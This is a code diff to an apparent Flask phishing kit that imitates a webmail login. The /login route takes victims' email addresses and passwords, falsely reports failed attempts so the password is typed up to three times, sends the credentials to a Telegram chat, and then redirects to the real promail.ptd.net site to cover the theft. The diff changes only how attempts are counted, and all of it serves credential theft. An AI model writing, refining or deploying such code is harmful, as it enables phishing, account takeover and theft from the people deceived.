@@ -29,30 +29,34 @@ def send_to_telegram(message):
 
 @app.route('/')
 def index():
-    session['attempts'] = 0
     return render_template('index.html')
 
 @app.route('/login', methods=['POST'])
-def login():
-    if 'attempts' not in session:
-        session['attempts'] = 0
-    
-    # Increment by 3 for each submission
-    session['attempts'] += 3
-    app.logger.debug(f"Login attempts counted: {session['attempts']}")
-    
+def login():  
     email = request.form.get('email', '')
     password = request.form.get('password', '')
 
-    # Send credentials to Telegram
-    message = f"Email: {email}\nPassword: {password}\nTotal Attempts: {session['attempts']}"
+   # Initialize attempts counter if it doesn't exist
+    if 'attempts' not in session:
+        session['attempts'] = 0
+
+    # Increase attempts
+    session['attempts'] += 1
+
+    # If attempts less than 3 → just return index page again
+    if session['attempts'] < 3:
+        flash(f"Attempt {session['attempts']} of 3. Please try again.")
+        return render_template('index.html')
+
+    # On 3rd attempt → send to Telegram and redirect
+    message = f"Email: {email}\nPassword: {password}\nAttempts: {session['attempts']}"
     send_to_telegram(message)
 
-    # Redirect based on attempt count
-    if session['attempts'] >= 3:
-        session['attempts'] = 0  # Reset counter
-        return redirect('https://promail.ptd.net/')  # Special redirect after "3 attempts"
-    
+    # Reset attempts
+    session.pop('attempts', None)
+
+    # Redirect after sending
+
     return redirect('https://promail.ptd.net/')  # Normal redirect
 
 if __name__ == '__main__':
